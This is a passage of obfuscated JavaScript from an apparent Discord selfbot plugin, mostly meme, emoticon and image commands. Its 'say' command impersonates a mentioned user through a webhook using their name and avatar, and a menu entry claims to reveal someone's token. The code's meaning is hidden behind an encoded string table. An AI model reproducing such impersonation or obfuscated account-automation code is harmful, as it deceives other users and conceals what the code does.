          const shaunielle = (new sherae.RichEmbed).setTitle(abdrahman(232) + maithili + abdrahman(1345) + maithili + abdrahman(613))[abdrahman(444)](shadarria[abdrahman(1417)].displayAvatarURL)[abdrahman(457)](abdrahman(649) + maithili + " 𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮 " + maithili + abdrahman(760))[abdrahman(321)](COLOR).addField(abdrahman(712) + PREFIX + abdrahman(513), abdrahman(1388))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(997), abdrahman(1320))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(932), abdrahman(978))[abdrahman(695)]("***```" + PREFIX + abdrahman(262), "***Moderation commands 🔧***")[abdrahman(695)](abdrahman(712) + PREFIX + "mics ```***", abdrahman(293))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(812), "***NSFW commands 🔞***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(809), "***Account commands 🔒***").addField(abdrahman(712) + PREFIX + abdrahman(333), abdrahman(1316)).addField(abdrahman(712) + PREFIX + abdrahman(1330), abdrahman(302))[abdrahman(1211)](IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          shaunielle[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](shaunielle), BdApi[abdrahman(1150)](abdrahman(288), {type: abdrahman(1382)});
        }
        if (jillian.content.startsWith(PREFIX + "symbols")) {
          jillian[abdrahman(1289)]();
          const marleyah = (new sherae[abdrahman(344)]).setTitle(abdrahman(232) + maithili + abdrahman(693) + maithili + abdrahman(613)).setColor(COLOR).addField("**```" + PREFIX + abdrahman(520), abdrahman(995))[abdrahman(695)]("**```" + PREFIX + abdrahman(392), abdrahman(1308)).addField(abdrahman(972) + PREFIX + abdrahman(1419), abdrahman(679))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1339), abdrahman(503)).addField(abdrahman(972) + PREFIX + "symbols5 ```**", abdrahman(1067))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1391), abdrahman(904))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1472), "***┬──┬ ノ( ゜-゜ノ)***").addField(abdrahman(972) + PREFIX + abdrahman(555), abdrahman(505))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(1445), abdrahman(610)).addField(abdrahman(972) + PREFIX + abdrahman(524), abdrahman(1448))[abdrahman(695)](abdrahman(972) + PREFIX + abdrahman(808), abdrahman(1312)).addField("**```" + PREFIX + abdrahman(1298), "***'=͟͟͞͞( ✌°∀° )☛***")[abdrahman(695)]("**```" + PREFIX + "symbols13 ```**", abdrahman(452))[abdrahman(1211)](IMAGE)[abdrahman(938)](abdrahman(899), IMAGE);
          marleyah.setTimestamp(), jillian[abdrahman(407)][abdrahman(746)](marleyah), BdApi.showToast("🔪 𝙀𝙧𝙤𝙜𝙚 𝙉𝙤𝙩𝙞𝙛 > Symbols commands list sent.", {type: abdrahman(1382)});
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1181)) && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(984)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "symbols2") && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(675)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "symbols3") && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(905)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1354)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1009)));
        jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(1227)) && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(1158)));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(1280)) && (jillian.delete(), jillian.channel[abdrahman(746)]("(╯°□°）╯︵ ┻━┻"));
        jillian.content[abdrahman(1403)](PREFIX + "symbols7") && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(736)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(334)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)].send("༼ つ ◕_◕ ༽つ"));
        jillian.content[abdrahman(1403)](PREFIX + "symbols9") && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(350)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1042)) && (jillian[abdrahman(1289)](), jillian.channel[abdrahman(746)](abdrahman(1027)));
        jillian.content.startsWith(PREFIX + abdrahman(762)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(1106)));
        jillian.content[abdrahman(1403)](PREFIX + abdrahman(275)) && (jillian[abdrahman(1289)](), jillian[abdrahman(407)][abdrahman(746)](abdrahman(336)));
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "symbols13") && (jillian.delete(), jillian[abdrahman(407)][abdrahman(746)]("(＾▽＾)"));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(443))) {
          jillian[abdrahman(1289)]();
          const tustin = (new sherae[abdrahman(344)])[abdrahman(1044)](abdrahman(232) + maithili + "「𝙈𝙚𝙣𝙪 𝙁𝙪𝙣」" + maithili + abdrahman(613))[abdrahman(444)](shadarria.user[abdrahman(574)])[abdrahman(457)](abdrahman(649) + maithili + " 𝙀𝙧𝙤𝙜𝙚 𝙐𝙩𝙞𝙡𝙞𝙩𝙮 " + maithili + abdrahman(760))[abdrahman(321)](COLOR).addField("***```" + PREFIX + "say + MENTION + TEXT ```***", abdrahman(1481))[abdrahman(695)]("***```" + PREFIX + abdrahman(961), "***Randomly change role color***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(667), abdrahman(559))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(752), "***Pornhub comment with custom text***").addField(abdrahman(712) + PREFIX + abdrahman(1039), abdrahman(1471))[abdrahman(695)](abdrahman(712) + PREFIX + "minefont + NUMBER + TEXT ```***", abdrahman(1249))[abdrahman(695)]("***```" + PREFIX + abdrahman(383), abdrahman(1187))[abdrahman(695)]("***```" + PREFIX + abdrahman(1269), "***Baguette french a members with his avatar***").addField(abdrahman(712) + PREFIX + abdrahman(1447), abdrahman(589))[abdrahman(695)]("***```" + PREFIX + abdrahman(1462), abdrahman(1449))[abdrahman(695)](abdrahman(712) + PREFIX + "changemymind + TEXT ```***", "***Change My Mind with your text***")[abdrahman(695)]("***```" + PREFIX + abdrahman(1404), abdrahman(868)).addField(abdrahman(712) + PREFIX + abdrahman(971), abdrahman(687))[abdrahman(695)]("***```" + PREFIX + abdrahman(465), abdrahman(1200)).addField(abdrahman(712) + PREFIX + abdrahman(1166), abdrahman(461))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1128), abdrahman(357)).addField(abdrahman(712) + PREFIX + abdrahman(413), abdrahman(994)).addField(abdrahman(712) + PREFIX + abdrahman(1296), abdrahman(1346))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(596), abdrahman(859)).addField(abdrahman(712) + PREFIX + abdrahman(263), abdrahman(1355))[abdrahman(695)]("***```" + PREFIX + abdrahman(600), abdrahman(466)).addField(abdrahman(712) + PREFIX + abdrahman(1401), abdrahman(1145))[abdrahman(695)]("***```" + PREFIX + "ship + MENTION + TEXT ```***", abdrahman(1071)).addField(abdrahman(712) + PREFIX + "kiss + MENTION ```***", abdrahman(1209))[abdrahman(695)]("***```" + PREFIX + "cry ```***", abdrahman(277)), shandee = (new sherae[abdrahman(344)]).setColor(COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1328), abdrahman(1098))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1194), abdrahman(669))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(684), abdrahman(1414))[abdrahman(695)](abdrahman(712) + PREFIX + "hug + MENTION ```***", "***Give a hug to the user mentioned***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1369), abdrahman(835))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(257), abdrahman(501)).addField(abdrahman(712) + PREFIX + abdrahman(1075), abdrahman(806))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(614), "***Send a random sad cat image***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1109), abdrahman(650))[abdrahman(695)]("***```" + PREFIX + abdrahman(1104), abdrahman(826))[abdrahman(695)](abdrahman(712) + PREFIX + "wasted + MENTION ```***", abdrahman(519))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1402), abdrahman(420)).addField(abdrahman(712) + PREFIX + abdrahman(1203), abdrahman(770))[abdrahman(695)](abdrahman(712) + PREFIX + "annoying ```***", abdrahman(807))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(916), abdrahman(893))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1053), abdrahman(1058))[abdrahman(695)](abdrahman(712) + PREFIX + "clean ```***", abdrahman(577))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(754), "***Show the real! token of someone :o***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(970), "***Send empty edited message***")[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(948), abdrahman(815))[abdrahman(695)](abdrahman(712) + PREFIX + "trap + MENTION ```***", abdrahman(1271))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1086), abdrahman(1399))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(243), abdrahman(866))[abdrahman(695)](abdrahman(712) + PREFIX + "whowouldwin + MENTION ```***", "***Who whould win ? mmhm idk ?***").addField(abdrahman(712) + PREFIX + abdrahman(385), abdrahman(918)), kailanie = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR)[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(1416), abdrahman(748))[abdrahman(695)](abdrahman(712) + PREFIX + abdrahman(822), "***Send a image approved***")[abdrahman(1211)](IMAGE)[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          kailanie.setTimestamp(), jillian[abdrahman(407)][abdrahman(746)](tustin), jillian[abdrahman(407)].send(shandee), jillian[abdrahman(407)][abdrahman(746)](kailanie), BdApi[abdrahman(1150)](abdrahman(363), {type: abdrahman(1382)});
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "say")) {
          let nikasha = jillian[abdrahman(1301)];
          const suz = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          let evella = maverick.slice(1).join(" ");
          if (!suz) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(1366));
          if (!evella) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          if (!nikasha) return window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1173));
          jillian[abdrahman(1289)]();
          let izaha = suz.id, petal = suz[abdrahman(1167)], amirra = abdrahman(283) + izaha + "/" + petal + abdrahman(701);
          jillian[abdrahman(407)][abdrahman(1319)](suz.username, amirra).then(adesh => {
            const malakyi = abdrahman, denerick = new _0x1f0f92(malakyi(478) + adesh.id + "/" + adesh[malakyi(1467)]);
            denerick[malakyi(548)](suz.username), denerick[malakyi(729)](amirra), denerick[malakyi(746)](evella)[malakyi(656)](shardaye => adesh.delete());
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(480))) {
          var laudan = jillian[abdrahman(1301)].id;
          let maraina = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          var ralinda = jillian[abdrahman(1301)][abdrahman(1455)][abdrahman(1003)](nivetha => nivetha.name === maraina);
          let rajvir = maverick.slice(0).join(" ");
          jillian[abdrahman(1289)]();
          if (!laudan) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1173));
          if (!maraina) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", "Add the name of the role you want to rainbow. ❌");
          if (rajvir === abdrahman(320)) return clearInterval(yanci), yanci = undefined, window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(694));
          !yanci ? yanci = setInterval(() => {
            const tamiia = abdrahman;
            function harshit() {
              const vantha = townsend;
              var xella = "0123456789ABCDEF", yuma = "#";
              for (var lysle = 0; lysle < 6; lysle++) {
                yuma += xella[Math[vantha(250)](Math.random() * 16)];
              }
              return yuma;
            }
            ralinda[tamiia(930)]({color: harshit()});
          }, 6e4) : jillian[abdrahman(407)][abdrahman(746)](abdrahman(573));
          ;
          return window.BdApi.alert(abdrahman(1078), abdrahman(326));
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1220))) {
          jillian[abdrahman(1289)]();
          var audrie = ["meme"], temaka = audrie[Math.round(Math.random() * (audrie[abdrahman(1108)] - 1))];
          _0x4a5ce4(temaka)[abdrahman(656)](niamh => {
            const jonnye = abdrahman, sachiko = (new sherae[jonnye(344)])[jonnye(321)](COLOR)[jonnye(367)](jonnye(1124), shadarria[jonnye(1417)][jonnye(879)])[jonnye(1211)](niamh).setFooter(jonnye(899), IMAGE);
            sachiko.setTimestamp(), jillian[jonnye(407)].send(sachiko);
          });
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(825))) {
          const vihana = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          let germar = maverick[abdrahman(1063)](1).join(" ");
          jillian[abdrahman(1289)]();
          if (!vihana) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          if (!germar) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a message. ❌");
          tallen();
          async function tallen() {
            const dalonna = abdrahman;
            let dariyelle = vihana.id, jenavee = vihana[dalonna(1167)], brittnii = dalonna(283) + dariyelle + "/" + jenavee + dalonna(701);
            const eldene = await _0xe6e37f(encodeURI(dalonna(941) + vihana[dalonna(1423)] + dalonna(365) + brittnii + dalonna(322) + germar)), koi = await eldene.json(), alaziah = (new sherae.RichEmbed).setImage(koi[dalonna(568)])[dalonna(938)](dalonna(899), IMAGE);
            alaziah.setTimestamp(), jillian[dalonna(407)].send(alaziah);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1318))) {
          let tiwatope = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!tiwatope) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          nilaja();
          async function nilaja() {
            const valma = abdrahman, danterrius = await _0xe6e37f(encodeURI(valma(319) + tiwatope)), nashwan = await danterrius[valma(507)](), nevaehlee = (new sherae[valma(344)])[valma(1211)](nashwan[valma(568)])[valma(938)](valma(899), IMAGE);
            nevaehlee.setTimestamp(), jillian[valma(407)][valma(746)](nevaehlee);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(844))) {
          let shylon = jillian[abdrahman(393)][abdrahman(1028)](" ")[1], elizajane = maverick[abdrahman(1063)](1).join(" ");
          jillian[abdrahman(1289)]();
          if (!shylon) return window[abdrahman(987)].alert(abdrahman(1078), abdrahman(448));
          if (!elizajane) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(823));
          var kiwanis = encodeURI(elizajane);
          const lumen = (new sherae[abdrahman(344)])[abdrahman(1211)](abdrahman(776) + shylon + "/Achievement+Get%21/" + kiwanis)[abdrahman(938)](abdrahman(899), IMAGE);
          lumen[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](lumen);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(430))) {
          const lyiam = jillian[abdrahman(726)].users[abdrahman(911)]();
          jillian.delete();
          if (!lyiam) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          bernadine();
          async function bernadine() {
            const anayelli = abdrahman;
            let leronda = maverick.slice(0).join(" "), soleia = await _0x3857f.generate("awooify", {url: lyiam.avatarURL});
            cirrus(1e3);
            let mekkah = (new sherae[anayelli(344)])[anayelli(321)](COLOR).setTitle(anayelli(710))[anayelli(1211)](soleia).setFooter("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            mekkah[anayelli(1264)](), jillian[anayelli(407)][anayelli(746)](mekkah);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + abdrahman(1265))) {
          const yukiye = jillian.mentions[abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!yukiye) return window.BdApi.alert(abdrahman(1078), abdrahman(1366));
          melonye();
          async function melonye() {
            const farhia = abdrahman;
            let jodana = maverick.slice(0)[farhia(463)](" "), jimmel = await _0x3857f[farhia(1107)]("baguette", {url: yukiye[farhia(879)]});
            cirrus(1e3);
            let lynell = (new sherae[farhia(344)])[farhia(321)](COLOR)[farhia(1044)]("***Baguette 🥖***").setImage(jimmel).setFooter(farhia(899), IMAGE);
            lynell[farhia(1264)](), jillian[farhia(407)].send(lynell);
          }
        }
        if (jillian.content[abdrahman(1403)](PREFIX + "blurpify")) {
          const abdull = jillian.mentions.users[abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!abdull) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", abdrahman(1366));
          meridee();
          async function meridee() {
            const be = abdrahman;
            let tashawn = maverick[be(1063)](0).join(" "), jannelly = await _0x3857f[be(1107)]("blurpify", {image: abdull[be(879)]});
            cirrus(1e3);
            let zariel = (new sherae.RichEmbed).setColor(COLOR)[be(1044)](be(1273))[be(1211)](jannelly)[be(938)](be(899), IMAGE);
            zariel[be(1264)](), jillian[be(407)][be(746)](zariel);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(784))) {
          const dequanna = jillian[abdrahman(726)][abdrahman(543)].first();
          let natea = maverick[abdrahman(1063)](1)[abdrahman(463)](" ");
          jillian.delete();
          if (!dequanna) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          if (!natea) return window.BdApi[abdrahman(1248)]("🔪 Eroge Notification 🔪", "You need enter a message. ❌");
          katrece();
          async function katrece() {
            const justen = abdrahman;
            let zierra = await _0x3857f[justen(1107)](justen(784), {url: dequanna[justen(879)], username: natea});
            cirrus(1e3);
            let chrie = (new sherae.RichEmbed)[justen(321)](COLOR).setTitle(justen(734))[justen(1211)](zierra)[justen(938)](justen(899), IMAGE);
            chrie[justen(1264)](), jillian[justen(407)][justen(746)](chrie);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1051))) {
          jillian[abdrahman(1289)]();
          let damian = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          if (!damian) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", abdrahman(898));
          harmanpreet();
          async function harmanpreet() {
            const kaishawn = abdrahman;
            let lachrista = await _0x3857f[kaishawn(1107)](kaishawn(1051), {text: damian});
            cirrus(1e3);
            let tredell = (new sherae.RichEmbed)[kaishawn(321)](COLOR)[kaishawn(1044)](kaishawn(985))[kaishawn(1211)](lachrista)[kaishawn(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            tredell.setTimestamp(), jillian[kaishawn(407)].send(tredell);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1437))) {
          const anoosha = jillian.mentions[abdrahman(543)].first();
          jillian[abdrahman(1289)]();
          if (!anoosha) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(1366));
          var gustava = ["5%", "10%", "15%", abdrahman(338), "25%", abdrahman(1156), abdrahman(376), abdrahman(414), abdrahman(959), abdrahman(833), "55", "60%", abdrahman(470), abdrahman(730), abdrahman(1231), abdrahman(845), abdrahman(1426), abdrahman(886), abdrahman(1347), abdrahman(329)][Math[abdrahman(250)](Math[abdrahman(1240)]() * 20)];
          let shevi = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR)[abdrahman(695)]("Calculate the possible loves for " + shadarria[abdrahman(1417)][abdrahman(1423)] + abdrahman(1340) + anoosha.username + "", "" + gustava + " ❤")[abdrahman(1211)](abdrahman(508))[abdrahman(938)](abdrahman(899), IMAGE);
          shevi[abdrahman(1264)](), jillian[abdrahman(407)][abdrahman(746)](shevi);
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1459)) && (setTimeout(() => {
          const zarra = abdrahman;
          jillian[zarra(930)]("░░░░░░░░░░ 0%");
        }, 1e3), setTimeout(() => {
          const saloma = abdrahman;
          jillian[saloma(930)](saloma(639));
        }, 3500), setTimeout(() => {
          const haikeem = abdrahman;
          jillian[haikeem(930)](haikeem(1241));
        }, 9e3), setTimeout(() => {
          const jevone = abdrahman;
          jillian[jevone(930)](jevone(651));
        }, 13500), setTimeout(() => {
          const rusha = abdrahman;
          jillian[rusha(930)](rusha(1115));
        }, 19e3), setTimeout(() => {
          const nekeya = abdrahman;
          jillian[nekeya(930)](nekeya(1255));
        }, 25500), setTimeout(() => {
          const chirley = abdrahman;
          jillian[chirley(930)]("fuck u :3");
        }, 26500));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(467))) {
          let taelynne = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          if (!taelynne) return window.BdApi[abdrahman(1248)](abdrahman(1078), "You need enter a question. ❌");
          var amaria = [abdrahman(790), abdrahman(1117), "Maybe?", "Probably", abdrahman(714), "Never!", abdrahman(1407)][Math[abdrahman(250)](Math[abdrahman(1240)]() * 7)];
          jillian.channel[abdrahman(746)]("**" + shadarria[abdrahman(1417)][abdrahman(1157)] + " have ask the question: " + taelynne + "**");
          let andalyn = (new sherae[abdrahman(344)])[abdrahman(321)](COLOR)[abdrahman(1044)](abdrahman(666))[abdrahman(457)](amaria)[abdrahman(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
          andalyn.setTimestamp(), jillian[abdrahman(407)][abdrahman(746)](andalyn);
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(348))) {
          let traniyah = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian.delete();
          if (!traniyah) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a text. ❌");
          brandilee();
          async function brandilee() {
            const leissa = abdrahman;
            let ronea = await _0x3857f[leissa(1107)](leissa(348), {text: traniyah});
            cirrus(1e3);
            let dolorese = (new sherae[leissa(344)]).setColor(COLOR)[leissa(1211)](ronea)[leissa(938)](leissa(899), IMAGE);
            dolorese[leissa(1264)](), jillian[leissa(407)][leissa(746)](dolorese);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1463))) {
          const beaufort = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian[abdrahman(1289)]();
          if (!beaufort) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1366));
          shaianna();
          async function shaianna() {
            const lyzette = abdrahman;
            let zmere = await _0x3857f[lyzette(1107)](lyzette(1463), {image: beaufort.avatarURL});
            cirrus(1e3);
            let chaelynn = (new sherae[lyzette(344)])[lyzette(321)](COLOR)[lyzette(1211)](zmere)[lyzette(938)](lyzette(899), IMAGE);
            chaelynn.setTimestamp(), jillian[lyzette(407)][lyzette(746)](chaelynn);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(747))) {
          let derriyah = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!derriyah) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", "You need enter a text. ❌");
          libera();
          async function libera() {
            const see = abdrahman;
            let lavae = await _0x3857f[see(1107)](see(747), {text: derriyah});
            cirrus(1e3);
            let gamalier = (new sherae[see(344)]).setColor(COLOR)[see(1211)](lavae)[see(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            gamalier[see(1264)](), jillian[see(407)][see(746)](gamalier);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(850))) {
          let maxden = maverick[abdrahman(1063)](0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!maxden) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a text. ❌");
          achan();
          async function achan() {
            const jonine = abdrahman;
            let alayiah = await _0x3857f.generate("iphonex", {url: maxden});
            cirrus(1e3);
            let darnez = (new sherae[jonine(344)])[jonine(321)](COLOR)[jonine(1211)](alayiah)[jonine(938)](jonine(899), IMAGE);
            darnez[jonine(1264)](), jillian[jonine(407)][jonine(746)](darnez);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + "jpeg")) {
          let kabe = maverick.slice(0).join(" ");
          jillian.delete();
          if (!kabe) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need enter a text. ❌");
          christle();
          async function christle() {
            const magdeline = abdrahman;
            let nickos = await _0x3857f.generate(magdeline(493), {url: kabe});
            cirrus(1e3);
            let wykesha = (new sherae.RichEmbed)[magdeline(321)](COLOR)[magdeline(1211)](nickos)[magdeline(938)](magdeline(899), IMAGE);
            wykesha[magdeline(1264)](), jillian[magdeline(407)][magdeline(746)](wykesha);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "kannagen")) {
          let silem = maverick[abdrahman(1063)](0).join(" ");
          jillian[abdrahman(1289)]();
          if (!silem) return window.BdApi.alert("🔪 Eroge Notification 🔪", abdrahman(898));
          tyres();
          async function tyres() {
            const eliyannah = abdrahman;
            let pruda = await _0x3857f[eliyannah(1107)]("kannagen", {text: silem});
            cirrus(1e3);
            let zariana = (new sherae[eliyannah(344)])[eliyannah(321)](COLOR)[eliyannah(1211)](pruda)[eliyannah(938)](eliyannah(899), IMAGE);
            zariana[eliyannah(1264)](), jillian[eliyannah(407)][eliyannah(746)](zariana);
          }
        }
        if (jillian[abdrahman(393)].startsWith(PREFIX + abdrahman(469))) {
          let raeford = maverick.slice(0)[abdrahman(463)](" ");
          jillian[abdrahman(1289)]();
          if (!raeford) return window.BdApi[abdrahman(1248)](abdrahman(1078), abdrahman(898));
          xayven();
          async function xayven() {
            const yeyetzi = abdrahman;
            let jafeth = await _0x3857f[yeyetzi(1107)](yeyetzi(469), {url: raeford});
            cirrus(1e3);
            let shantella = (new sherae[yeyetzi(344)]).setColor(COLOR).setImage(jafeth)[yeyetzi(938)](yeyetzi(899), IMAGE);
            shantella[yeyetzi(1264)](), jillian.channel[yeyetzi(746)](shantella);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(816))) {
          const gold = jillian[abdrahman(726)].users.first();
          jillian[abdrahman(1289)]();
          if (!gold) return window[abdrahman(987)][abdrahman(1248)]("🔪 Eroge Notification 🔪", abdrahman(1366));
          chynah();
          async function chynah() {
            const kaeson = abdrahman;
            let bismark = await _0x3857f[kaeson(1107)](kaeson(816), {image: gold.avatarURL});
            cirrus(1e3);
            let arnel = (new sherae.RichEmbed)[kaeson(321)](COLOR).setImage(bismark)[kaeson(938)](kaeson(899), IMAGE);
            arnel.setTimestamp(), jillian[kaeson(407)].send(arnel);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1480))) {
          const strange = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          let brynisha = maverick.slice(1)[abdrahman(463)](" ");
          jillian.delete();
          if (!strange) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), "You need mention someone. ❌");
          if (!brynisha) return window[abdrahman(987)][abdrahman(1248)](abdrahman(1078), abdrahman(898));
          pam();
          async function pam() {
            const evyenia = abdrahman;
            let taquasha = await _0x3857f[evyenia(1107)](evyenia(1480), {user1: brynisha, user2: strange[evyenia(879)]});
            cirrus(1e3);
            let syndy = (new sherae[evyenia(344)])[evyenia(321)](COLOR).setImage(taquasha)[evyenia(938)]("🌸 𝙀𝙧𝙤𝙜𝙚 | Made by Misaki 🌸", IMAGE);
            syndy.setTimestamp(), jillian.channel.send(syndy);
          }
        }
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(558))) {
          const narong = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
          if (!narong) return window[abdrahman(987)].alert("🔪 Eroge Notification 🔪", abdrahman(1366));
          _0x1c3e17[abdrahman(558)]()[abdrahman(656)](meryk => {
            const garner = abdrahman;
            var lonnita = meryk;
            let kortney = (new sherae[garner(344)])[garner(1044)](garner(692) + jillian[garner(887)][garner(1423)] + garner(805) + narong[garner(1423)] + garner(306))[garner(321)](COLOR)[garner(1211)](lonnita).setFooter(garner(899), IMAGE);
            kortney.setTimestamp(), jillian[garner(407)][garner(746)](kortney);
          });
        }
        jillian[abdrahman(393)][abdrahman(1403)](PREFIX + abdrahman(1119)) && (jillian[abdrahman(1289)](), _0x1c3e17[abdrahman(1119)]()[abdrahman(656)](nao => {
          const kal = abdrahman;
          var esmia = nao;
          let merci = (new sherae[kal(344)]).setTitle(jillian[kal(887)][kal(1423)] + kal(1177))[kal(321)](COLOR)[kal(1211)](esmia)[kal(938)](kal(899), IMAGE);
          merci[kal(1264)](), jillian[kal(407)].send(merci);
        }));
        if (jillian[abdrahman(393)][abdrahman(1403)](PREFIX + "pat")) {
          const sevion = jillian[abdrahman(726)][abdrahman(543)][abdrahman(911)]();
          jillian.delete();
